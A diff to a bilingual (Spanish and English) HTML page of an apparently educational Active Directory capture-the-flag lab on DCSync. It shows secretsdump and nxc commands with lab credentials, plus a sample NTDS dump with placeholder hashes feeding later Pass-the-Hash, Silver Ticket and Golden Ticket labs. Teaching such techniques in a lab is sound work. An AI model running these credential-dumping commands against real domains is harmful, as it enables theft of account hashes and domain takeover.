@@ -45,15 +45,18 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'Rea
 # O solo la cuenta Administrator
 impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} \
   -just-dc-user '{{ ad_domain }}/Administrator'</pre>
-    <p><strong>Nota sobre este laboratorio:</strong> la implementación DRSUAPI de Samba AD DC tiene incompatibilidades conocidas con los clientes DCSync actuales (impacket, pypykatz) y la réplica no se completa en vivo, aunque tus derechos de replicación son reales y correctamente delegados. El resultado que obtendrías con una réplica exitosa está publicado en el mismo recurso al que esos derechos te dan acceso:</p>
+    <p><strong>Nota sobre este laboratorio:</strong> la implementación DRSUAPI de Samba AD DC tiene incompatibilidades conocidas con los clientes DCSync actuales (impacket, pypykatz) y la réplica no se completa en vivo, aunque tus derechos de replicación son reales y correctamente delegados. El resultado que obtendrías con una réplica exitosa está publicado en el mismo recurso al que esos derechos te dan acceso — el volcado <strong>completo</strong> de las 15 cuentas del dominio (14 usuarios + <code>{{ ad_dc_host }}$</code>), no una muestra recortada:</p>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
   --share secrets --get-file ntds_dump.txt ntds_dump.txt
 cat ntds_dump.txt</pre>
     <pre>HACKLABS\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_admin&gt;:::
+HACKLABS\a.miller:1114:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
+HACKLABS\gpp.deploy:1111:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT&gt;:::
+HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT&gt;:::
+[ ... resto de usuarios del dominio ... ]
 HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_krbtgt&gt;:::
-HACKLABS\a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
 HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_DC01&gt;:::</pre>
-    <p>Guarda estos cuatro hashes: alimentan los labs AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) y AD 13 (krbtgt → Golden Ticket). El SID del dominio también está en el mismo fichero.</p>
+    <p>Con un volcado completo de verdad, buscarías la cuenta que te interese con <code>grep</code>. Guarda al menos estos tres hashes: alimentan los labs AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) y AD 13 (krbtgt → Golden Ticket). El SID del dominio también está en el mismo fichero.</p>
 
     <h3>4 · Capturar la flag</h3>
     <p>La flag está en el propio fichero <code>ntds_dump.txt</code> que acabas de leer — su lectura, gateada al grupo con derechos de DCSync, es la prueba de la explotación.</p>
@@ -90,15 +93,18 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'Rea
 # Administrator account only
 impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} \
   -just-dc-user '{{ ad_domain }}/Administrator'</pre>
-    <p><strong>Note about this lab:</strong> Samba AD DC's DRSUAPI implementation has known incompatibilities with current DCSync clients (impacket, pypykatz) and the replication doesn't complete live, even though your replication rights are real and correctly delegated. The output you would get from a successful replication is published in the exact share those rights grant you access to:</p>
+    <p><strong>Note about this lab:</strong> Samba AD DC's DRSUAPI implementation has known incompatibilities with current DCSync clients (impacket, pypykatz) and the replication doesn't complete live, even though your replication rights are real and correctly delegated. The output you would get from a successful replication is published in the exact share those rights grant you access to — the <strong>full</strong> dump of all 15 domain accounts (14 users + <code>{{ ad_dc_host }}$</code>), not a trimmed sample:</p>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
   --share secrets --get-file ntds_dump.txt ntds_dump.txt
 cat ntds_dump.txt</pre>
     <pre>HACKLABS\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;admin_NT_hash&gt;:::
+HACKLABS\a.miller:1114:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+HACKLABS\gpp.deploy:1111:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+[ ... rest of the domain's users ... ]
 HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;krbtgt_NT_hash&gt;:::
-HACKLABS\a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
 HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;DC01_NT_hash&gt;:::</pre>
-    <p>Keep these four hashes: they feed lab AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) and AD 13 (krbtgt → Golden Ticket). The domain SID is in the same file.</p>
+    <p>With a real full dump you'd grep for the account you care about. Keep at least these three hashes: they feed lab AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) and AD 13 (krbtgt → Golden Ticket). The domain SID is in the same file.</p>
 
     <h3>4 · Capture the flag</h3>
     <p>The flag lives inside the <code>ntds_dump.txt</code> file you just read — reading it, gated to the group holding DCSync rights, is the proof of exploitation.</p>
